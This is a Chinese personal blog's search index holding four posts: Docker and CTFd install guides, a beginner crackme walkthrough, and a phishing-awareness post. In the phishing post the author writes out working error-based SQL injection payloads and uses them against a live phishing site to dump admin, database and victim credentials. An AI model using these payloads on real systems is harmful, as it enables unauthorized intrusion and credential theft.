<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Docker安装指南</title>
      <link href="/2019/07/19/Docker-install/"/>
      <url>/2019/07/19/Docker-install/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>很久以前就对Docker了解一些，但是一直没用过，所以也没接触到，前一段时间必须要用Docker做一些东西，接触了才深感Docker的强大！本来没想写Docker的安装这种教程，毕竟比较简单，而且网上有很多详细的教程，即使安装出错百度一下也能找到对应的解决方法，然而最近想记录一下关于学习Docker系列的笔记，所以由浅入深，就先把安装步骤写了吧。此次选择了两个系统进行安装，一个是Centos 7一个是Ubuntu 16.04，并未涉及Windows和OS X系统，如有需求可以百度查阅相关资料。  </p><h1 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h1><ul><li>64位CPU架构的计算机。  </li><li>建议系统的Linux内核版本在3.10及以上。  </li></ul><p>查看Linux内核版本  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]# uname -r</span><br><span class="line">3.10.0-957.el7.x86_64</span><br></pre></td></tr></table></figure><h1 id="安装Docker"><a href="#安装Docker" class="headerlink" title="安装Docker"></a>安装Docker</h1><h2 id="Centos-7安装Docker"><a href="#Centos-7安装Docker" class="headerlink" title="Centos 7安装Docker"></a>Centos 7安装Docker</h2><p>1.首先安装所需的软件包  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo yum install -y yum-utils device-mapper-persistent-data lvm2 bind-utils</span><br></pre></td></tr></table></figure><p>2.设置yum源  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo yum-config-manager --add-repo https://download.docker.com/linux/centos/docker-ce.repo</span><br></pre></td></tr></table></figure><p>3.查看仓库中所有可安装的docker版本，你可以根据需求来选择指定版本安装  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo yum list docker-ce --showduplicates | sort -r</span><br></pre></td></tr></table></figure><p>4.安装最新版Docker-ce  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo yum -y install docker-ce</span><br></pre></td></tr></table></figure><p>5.启动Docker并加入开机自启动  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl start docker</span><br><span class="line">sudo systemctl enable docker</span><br></pre></td></tr></table></figure><p>6.验证Docker是否成功安装  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo docker version</span><br></pre></td></tr></table></figure><p><img src="https://tva1.sinaimg.cn/large/007DFXDhly1g560kbpm2vj30rc0cr3z7.jpg" alt="安装成功"></p><h2 id="Ubuntu-16-04安装Docker"><a href="#Ubuntu-16-04安装Docker" class="headerlink" title="Ubuntu 16.04安装Docker"></a>Ubuntu 16.04安装Docker</h2><p>1.先卸载可能存在的旧版本  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get remove docker docker-engine docker-ce docker.io</span><br></pre></td></tr></table></figure><p>2.更新软件源中的所有软件列表  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update</span><br></pre></td></tr></table></figure><p>3.安装以下包以使apt可以通过HTTPS使用存储库(repository)  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install -y apt-transport-https ca-certificates curl software-properties-common</span><br></pre></td></tr></table></figure><p>4.添加Docker官方的GPG密钥  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo apt-key add -</span><br></pre></td></tr></table></figure><p>5.设置stable存储库  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo add-apt-repository &quot;deb [arch=amd64] https://download.docker.com/linux/ubuntu $(lsb_release -cs) stable&quot;</span><br></pre></td></tr></table></figure><p>6.再次更新软件源中的所有软件列表  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update</span><br></pre></td></tr></table></figure><p>7.安装最新版Docker-ce  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install -y docker-ce</span><br></pre></td></tr></table></figure><p>8.查看docker服务是否启动  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl status docker</span><br></pre></td></tr></table></figure><p><img src="https://tva4.sinaimg.cn/large/007DFXDhgy1g561247nz6j30kc05i0tl.jpg" alt="成功启动"><br>如果未启动，启动docker服务  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl start docker</span><br></pre></td></tr></table></figure><p>9.验证Docker是否安装成功  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo docker version</span><br></pre></td></tr></table></figure><p><img src="https://tva4.sinaimg.cn/large/007DFXDhgy1g5616rqom2j30k708zt9s.jpg" alt="安装成功"><br><strong>部分参考来源于网络，<a href="https://blog.csdn.net/jinking01/article/details/82490688" target="_blank" rel="noopener">参考链接</a></strong></p>]]></content>
      
      
      <categories>
          
          <category> 虚拟化 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>你的QQ就是这样被盗的|防范网络钓鱼</title>
      <link href="/2019/07/08/Phishing-site/"/>
      <url>/2019/07/08/Phishing-site/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>以前在qq上就收到过朋友发来的二维码链接啥的，一般的套路就是诱导你扫描这个二维码或者点击这个链接。<br>例如某天爱玩吃鸡的你收到一条链接，标题是点击领取金币领皮肤领…然后你兴奋的不行，点开之后让你输入账号密码登录，你看着这个页面，没有发现半点可疑的地方，然后就把账号密码随手输了进去。不一会儿，你的qq提示在其他地方登录，然后你列表的好友就都收到了你发给他们的链接。又比如某天，你收到一条消息/一条空间留言，内容是：这个人的qq空间里怎么有你的照片？又或者是：这个人是谁？为什么他空间有你俩的合影？单纯善良好奇心又巨强的你瞬间懵了，同学？我和谁合过影啊？都忘了，赶紧去看看。但是你点击以后是个qq空间的页面让你登录，合情合理啊，毕竟是qq空间相册，那就登录呗，然后你qq就掉线了。<br>本文没啥技术含量，因为这几天正好碰到一个钓鱼网站，结合着真实的钓鱼网站打算给朋友们科普一下，提高一下防范意识。  </p><h1 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h1><p>某个无聊的下午，正吃着西瓜刷着微博，突然收到一条QQ消息，吓得我赶紧放下了手中的西瓜…<br>是一个朋友发来的消息，内容如下：<br><img src="https://tva2.sinaimg.cn/large/007DFXDhgy1g4s5b20ueqj30jg0e8myh.jpg" alt><br>那就扫一下呗，二维码直接拿到电脑上扫了一下，得到一个短网址<br><img src="https://tva4.sinaimg.cn/large/007DFXDhgy1g4s5q096gwj30rl0agdft.jpg" alt><br>还原短网址得到一个链接<br><img src="https://tva3.sinaimg.cn/large/007DFXDhgy1g4s5qutvsdj31520fedg5.jpg" alt><br>然后我们直接访问这个链接，会先出现一个电脑管家安全检测的页面，最终会跳转到真实钓鱼网站的页面。不得不说，这个安全检测过程做的还有模有样的，这个过程会让人们更容易相信这是一个安全的网站，减少顾虑，从而增加成功的概率。(如果在手机qq里面长按二维码识别，然后跳转到钓鱼网站页面的过程是看不到网站域名的，最终只有一个qq空间登录页面。)<br><img src="https://tva3.sinaimg.cn/large/007DFXDhgy1g4s6gdq47vj321n0u0di8.jpg" alt><br>正常情况下，输入qq号码和密码后跳转到QQ空间黄钻活动页面。<br><img src="https://tva4.sinaimg.cn/large/007DFXDhgy1g4s6qqeplqj31hc0scab4.jpg" alt><br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g4sjxauxykj31hc0scjtb.jpg" alt>  </p><h1 id="尝试攻击"><a href="#尝试攻击" class="headerlink" title="尝试攻击"></a>尝试攻击</h1><p>前两天在FreeBuf上看到一个大佬对这类钓鱼网站的源码做了代码审计(<a href="https://www.freebuf.com/column/207162.html" target="_blank" rel="noopener">传送门</a>)，正好拿这个网站练练手。无奈管理员登录界面根本找不到，猜了半天，最终发现有一个“后台”拼音缩写的目录，但是访问也跳转不到管理地址，又扫了一下，无果，遂放弃。<br><img src="https://tva4.sinaimg.cn/large/007DFXDhgy1g4s73og3yjj31040eaglv.jpg" alt>  </p><h1 id="SQL注入漏洞"><a href="#SQL注入漏洞" class="headerlink" title="SQL注入漏洞"></a>SQL注入漏洞</h1><p>在对传递参数进行测试的过程中，发现密码输入框处存在SQL注入漏洞。<br>正常输入：<br><img src="https://tva4.sinaimg.cn/large/007DFXDhgy1g4s7ep27jfj30xr0d8t9w.jpg" alt><br>传递单引号报错：<br><img src="https://tva3.sinaimg.cn/large/007DFXDhgy1g4sk6lanbmj31fv0jhgn3.jpg" alt><br>此处的查询语句应该是  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from qq where username=&apos;xxx&apos; and password=&apos;xxx&apos;;</span><br></pre></td></tr></table></figure><p>本来以为是Sqlmap一把梭的那种，结果跑一下就被waf封IP，那就手工呗。<br>报错注入，已知表名是qq，字段名是username,password<br>获取数据库名：  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos; and (extractvalue(1,concat(0x7e,(select database()),0x7e)))#</span><br></pre></td></tr></table></figure><p><img src="https://tva2.sinaimg.cn/large/007DFXDhgy1g4uimkq8yvj31bx0e675r.jpg" alt><br>数据库名字为’db’，猜测管理员表名为admin，字段名同上  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos; and (extractvalue(1,concat(0x7e,(select username from db.admin),0x7e)))#</span><br></pre></td></tr></table></figure><p>由于extractvalue()这几种报错注入的方法最多显示32位，所以可以用substring()分割一下  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos; and (extractvalue(1,concat(0x7e,(substring((select password from db.admin),1,16 )),0x7e)))#</span><br></pre></td></tr></table></figure><p><img src="https://tva4.sinaimg.cn/large/007DFXDhgy1g4s865t25rj31es0frjsx.jpg" alt><br><img src="https://tva4.sinaimg.cn/large/007DFXDhgy1g4s8vui48sj31gc0cemyq.jpg" alt><br><img src="https://tva3.sinaimg.cn/large/007DFXDhgy1g4s8wmfu6qj31gf0c875u.jpg" alt><br>拿数据库的密码时用了另外一种方法  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos; and (select 1 from (select count(*),concat(&apos;~&apos;,(select Password from mysql.user where host=&apos;127.0.0.1&apos; limit 0,1),&apos;~&apos;,floor(rand(0)*2)) as a from information_schema.tables group by a)b)#</span><br></pre></td></tr></table></figure><p><img src="https://tva2.sinaimg.cn/large/007DFXDhgy1g4s929b50aj31ge0dsjt7.jpg" alt><br>查受害者的账号密码  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos; and (extractvalue(1,concat(0x7e,(select username from db.qq where id=1),0x7e,(select password from db.qq where id=1),0x7e)))#</span><br></pre></td></tr></table></figure><p><img src="https://tva2.sinaimg.cn/large/007DFXDhgy1g4s96egdw7j31gf0e675z.jpg" alt><br>本来还想试试load_file()读个配置文件啥的，后来发现是高版本的mysql，凉凉~  </p><h1 id="后续"><a href="#后续" class="headerlink" title="后续"></a>后续</h1><p>你还想看后续？？？你们有啥想法和思路倒是可以交流一下~比如什么给他提交10万条假数据一类的…  </p><h1 id="科普时间"><a href="#科普时间" class="headerlink" title="科普时间"></a>科普时间</h1><p>收集了几个网上公开的钓鱼网站源码，然后在本地搭建了一下，给大家看下效果。  </p><h2 id="QQ空间钓鱼"><a href="#QQ空间钓鱼" class="headerlink" title="QQ空间钓鱼"></a>QQ空间钓鱼</h2><p>手机访问效果如下：<br>输入账号密码后跳转至真实的网站<br><img src="https://tva4.sinaimg.cn/large/007DFXDhgy1g4sidekmc4j31hl0u0dil.jpg" alt><br>此时后台就拿到了你输入的内容<br><img src="https://tva3.sinaimg.cn/large/007DFXDhgy1g4siewcdmuj31hc0k43zx.jpg" alt></p><h2 id="游戏活动钓鱼"><a href="#游戏活动钓鱼" class="headerlink" title="游戏活动钓鱼"></a>游戏活动钓鱼</h2><p>访问效果<br><img src="https://tva4.sinaimg.cn/large/007DFXDhgy1g4sihch9o9j31hc0scwgc.jpg" alt><br><img src="https://tva2.sinaimg.cn/large/007DFXDhgy1g4siiayuw7j31hc0scjt5.jpg" alt><br><img src="https://tva3.sinaimg.cn/large/007DFXDhgy1g4sijqnxtnj31hc0izgnm.jpg" alt></p><h2 id="业务活动页面钓鱼"><a href="#业务活动页面钓鱼" class="headerlink" title="业务活动页面钓鱼"></a>业务活动页面钓鱼</h2><p><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g4sip813juj30ya0u0wi3.jpg" alt><br>后台收到账号信息<br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g4siq4mpdbj31hc0l6wg9.jpg" alt><br>这个网站也是输入完账号密码跳转到真实的页面，我发现这个页面分毫不差，看对比图<br><img src="https://tva3.sinaimg.cn/large/007DFXDhgy1g4siust5ogj30ya0u079u.jpg" alt><br>如何辨别钓鱼网站？<a href="https://www.zhihu.com/question/35424623" target="_blank" rel="noopener">知乎链接</a></p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
            <tag> 网络钓鱼 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>逆向学习[1]一道入门题详解</title>
      <link href="/2019/06/21/Simple-reverse/"/>
      <url>/2019/06/21/Simple-reverse/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>在学校的练习平台上找到了一个入门级的逆向小程序，给大家拿来练手。面向小白，大佬勿喷。<br><a href="https://pan.baidu.com/s/1wG9nMTSBVuJfK1Rrtds8pw" target="_blank" rel="noopener">程序下载地址，密码：a4nh</a>  </p><h1 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h1><p>找到验证逻辑的条件判断指令处，通过修改条件跳转指令，使得程序接下来走验证成功流程，即可在验证成功弹出消息框中得到对应Key。<br>首先下载源程序，然后拖到PEiD分析一下 ，发现存在UPX的壳。<br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g494p0ydboj30hd09w75b.jpg" alt><br>UPX脱壳工具网上有很多，随便找一个对程序进行脱壳即可。<br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g494r7gjdbj30h60chac5.jpg" alt><br>脱壳成功，然后把脱壳后的程序拖到Ollydbg分析。<br>先查找所有参考文本字符串，定位到程序弹出错误的地方。<br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g494tu348pj30e909hdg1.jpg" alt><br>查找”Serial is error!”字符串<br>00440570地址<br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g494vxbqv4j30vt0aht9t.jpg" alt><br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g494wk3gwsj30z40c9gmy.jpg" alt><br>向下走，发现这个跳转是由上方004404D6地址跳转实现的<br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g494xtery3j30yo0bg0ty.jpg" alt><br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g494ypdpojj30zi0bl3zl.jpg" alt><br>但是这个条件不是<br>继续向下走，00440500地址还有一处跳转，这个跳转是距离错误提示最近的<br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g494zl6tarj30yf0b5wfj.jpg" alt><br>我们在此处用NOP填充<br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g4950bzos2j30yo0bb40o.jpg" alt><br>然后再次运行程序，输入任意字符得到Key<br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g4951h8kw1j31030iidic.jpg" alt></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>非常基础入门的一道逆向题，希望以后有机会和时间能更新一些进阶的题目~</p>]]></content>
      
      
      <categories>
          
          <category> 逆向学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>浅谈新版CTFd的安装以及后期运维</title>
      <link href="/2019/06/19/Install-ctfd/"/>
      <url>/2019/06/19/Install-ctfd/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>前一段时间学校社团组织了一次CTF小比赛，当时就是用的CTFd这个平台。无奈的是最近CTFd更新了，所以旧版本的包我就安装不上了。最近研究了一下新版的CTFd(v2.1.2)，顺便还把新版的CTFd汉化了。总体来说，现在的CTFd功能越来越强大了，变成了团队赛以及个人赛两种模式，在管理员后台也可以给一些用户进行奖励加分的操作等等…<br><a href="https://github.com/CTFd/CTFd/" target="_blank" rel="noopener">官方Github地址</a>  </p><h1 id="环境要求"><a href="#环境要求" class="headerlink" title="环境要求"></a>环境要求</h1><ul><li>Centos 7 64位  </li><li>Docker  </li><li>docker-compose  </li><li>nginx  </li><li>python2.7  </li><li>python-pip  </li></ul><h1 id="安装过程"><a href="#安装过程" class="headerlink" title="安装过程"></a>安装过程</h1><p>我感觉用Docker安装更加方便一些，所以此次用docker-compose up的方式进行安装的。  </p><h2 id="首先安装Docker"><a href="#首先安装Docker" class="headerlink" title="首先安装Docker"></a>首先安装Docker</h2><p>安装需要的软件包  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo yum install -y yum-utils device-mapper-persistent-data lvm2 bind-utils</span><br></pre></td></tr></table></figure><p>设置yum源  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo yum-config-manager --add-repo https://download.docker.com/linux/centos/docker-ce.repo</span><br></pre></td></tr></table></figure><p>安装docker  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo yum install docker-ce</span><br></pre></td></tr></table></figure><p>启动并加入开机启动  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl start docker</span><br><span class="line">sudo systemctl enable docker</span><br></pre></td></tr></table></figure><p>验证是否安装成功  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker version</span><br></pre></td></tr></table></figure><p><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g45kxdj28gj30rs0cn0tf.jpg" alt>  </p><h2 id="安装docker-compose"><a href="#安装docker-compose" class="headerlink" title="安装docker-compose"></a>安装docker-compose</h2><p><a href="https://www.cnblogs.com/YatHo/p/7815400.html" target="_blank" rel="noopener">参考链接</a><br>先安装python-pip  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">yum -y install epel-release </span><br><span class="line">yum -y install python-pip</span><br></pre></td></tr></table></figure><p>检查pip是否安装成功  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip -V</span><br></pre></td></tr></table></figure><p><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g45l2t0tddj30rs01ea9x.jpg" alt><br>对安装的pip进行升级(可选)  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install --upgrade pip</span><br></pre></td></tr></table></figure><p>正式开始安装docker-compose  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install docker-compose</span><br></pre></td></tr></table></figure><p>安装pip报错以及解决方法  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">如果报错：ReadTimeoutError: HTTPSConnectionPool(host=&apos;pypi.python.org&apos;, port=443): Read timed out</span><br><span class="line">解决方法：pip --default-timeout=200 install -U docker-compose</span><br></pre></td></tr></table></figure><p>检查docker-compose是否成功安装  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose -version</span><br></pre></td></tr></table></figure><p><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g45l3vs231j30rs01dmx1.jpg" alt>  </p><h2 id="下载CTFd"><a href="#下载CTFd" class="headerlink" title="下载CTFd"></a>下载CTFd</h2><p>如果你的系统上没有git请先安装git  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo yum install -y git</span><br></pre></td></tr></table></figure><p>从Github上克隆CTFd  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/ctfd/ctfd.git</span><br></pre></td></tr></table></figure><p>也可以下载我打包好的压缩包直接上传到你的服务器，v2.1.2版本，当前最新。<br><a href="https://pan.baidu.com/s/1IhSEvnx5ZqmvXfDQLwIbkw" target="_blank" rel="noopener">下载链接地址，密码:xg7e</a><br>下载成功后解压，你可以看到一个CTFd文件夹<br>CTFd的主目录结构<br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g466dbvimwj317d0pgab2.jpg" alt><br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g466jptpwxj314k0m1js2.jpg" alt><br>此后你可以选择是否用中文版，如果想用中文版，直接下载我提供的汉化包替换主目录/CTFd路径下的themes目录即可(记得做好备份)。<br><a href="https://pan.baidu.com/s/17WgBkVZB10Qy5Na1VmoMng" target="_blank" rel="noopener">汉化包下载链接地址，密码:nkqd</a><br>然后在CTFd的主目录下  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose up</span><br></pre></td></tr></table></figure><p>静静等待安装完成，成功会弹出<code>http://0.0.0.0:8000</code><br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g45l6ek06bj30rs0ctmyu.jpg" alt><br>此时，你的CTFd就安装完成了。<br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g45lijhw0dj31hc0scgo5.jpg" alt><br>如果安装成功不能访问，看下是不是防火墙把端口给过滤掉了。  </p><h2 id="汉化效果"><a href="#汉化效果" class="headerlink" title="汉化效果"></a>汉化效果</h2><p>替换themes目录后效果如下：<br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g45nk6jo15j31hc0sc76u.jpg" alt><br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g45nkkdvmtj31hc0scgnk.jpg" alt>  </p><h1 id="后续运维"><a href="#后续运维" class="headerlink" title="后续运维"></a>后续运维</h1><p>CTFd的数据库用的是mariadb,看一下docker运行了哪些容器<br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g45lmw0n3sj316f098gm0.jpg" alt><br>可以看到运行了三个容器，分别是ctfd，mariadb，redis<br>我们可以直接进入到各个容器进行操作。  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker exec -it [CONTAINER ID] /bin/bash</span><br></pre></td></tr></table></figure><p>数据库root账户的密码默认为ctfd<br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g45ltk1suxj30rs0fugme.jpg" alt><br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g45m1smtvjj30rs0kdaav.jpg" alt>原先旧版的CTFd如果数据库不设置UTF-8会乱码，新版本测试过程中没碰到此类问题，如果乱码就进入到ctfd数据库敲一下命令  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ALTER TABLE [table name] CONVERT TO CHARACTER SET utf8;</span><br></pre></td></tr></table></figure><h2 id="配置Nginx"><a href="#配置Nginx" class="headerlink" title="配置Nginx"></a>配置Nginx</h2><p>如果有需要的话也可以配置一下nginx，这样访问速度会变快，而且作为一个中间件更改端口会更方便(当然小伙伴们选择Apache也是可以的)。<br><a href="https://www.cnblogs.com/kaid/p/7640723.html" target="_blank" rel="noopener">参考链接</a>  </p><h2 id="安装所需环境"><a href="#安装所需环境" class="headerlink" title="安装所需环境"></a>安装所需环境</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">yum install gcc-c++</span><br><span class="line">yum install -y pcre pcre-devel</span><br><span class="line">yum install -y zlib zlib-devel</span><br><span class="line">yum install -y openssl openssl-devel</span><br></pre></td></tr></table></figure><p>根目录下新建一个文件夹nginx  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mkdir /nginx</span><br><span class="line">cd /nginx</span><br><span class="line">wget https://nginx.org/download/nginx-1.14.2.tar.gz</span><br><span class="line">tar -zxvf nginx-1.14.2.tar.gz</span><br></pre></td></tr></table></figure><p>然后进入到目录下进行编译  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">./configure</span><br><span class="line">make</span><br><span class="line">make install</span><br></pre></td></tr></table></figure><p>查找一下nginx的位置<br><code>whereis nginx</code><br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g45nryi0csj30rs02i3ye.jpg" alt>  </p><h2 id="nginx常见命令"><a href="#nginx常见命令" class="headerlink" title="nginx常见命令"></a>nginx常见命令</h2><p>启动、停止nginx  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">cd /usr/local/nginx/sbin/</span><br><span class="line">./nginx</span><br><span class="line">./nginx -s stop</span><br><span class="line">./nginx -s quit</span><br><span class="line">./nginx -s reload</span><br><span class="line">./nginx -s quit:此方式停止步骤是待nginx进程处理任务完毕进行停止。</span><br><span class="line">./nginx -s stop:此方式相当于先查出nginx进程id再使用kill命令强制杀掉进程。</span><br></pre></td></tr></table></figure><h2 id="nginx开机自启动"><a href="#nginx开机自启动" class="headerlink" title="nginx开机自启动"></a>nginx开机自启动</h2><p>即在rc.local增加启动代码就可以了。<br><code>vi /etc/rc.local</code><br>增加一行 /usr/local/nginx/sbin/nginx (根据whereis nginx实际的位置为准)<br>设置执行权限：<br><code>chmod 755 rc.local</code><br><em>配置nginx</em><br><em>配置之前需要先运行一下nginx</em>  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./nginx</span><br><span class="line">./nginx -s quit</span><br></pre></td></tr></table></figure><p><em>然后在修改配置文件</em><br><code>vim /usr/local/nginx/conf/nginx.conf（whereis nginx 实际情况）</code><br>server下的location替换为  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">location /&#123;</span><br><span class="line">proxy_pass http://localhost:8000;</span><br><span class="line">proxy_set_header Host $host;</span><br><span class="line">proxy_set_header X-Real-IP $remote_addr;</span><br><span class="line">proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;</span><br><span class="line">proxy_redirect off;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g45nb1bstjj30rs0atmxi.jpg" alt><br>最后需要在firewall中开放80端口<br><code>firewall-cmd --zone=public --add-port=80/tcp --permanent</code><br>然后在启动一下nginx就可以通过80端口访问你的CTFd了。<br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g45ncjtfi5j30zv0dcwfa.jpg" alt><br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g45nd8o99rj31hc0scdie.jpg" alt><br><strong>注：有些安装步骤源于互联网，均已标注原文链接。</strong></p>]]></content>
      
      
      <categories>
          
          <category> 平台搭建 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTFd </tag>
            
            <tag> Docker </tag>
            
        </tags>
      
    </entry>
    
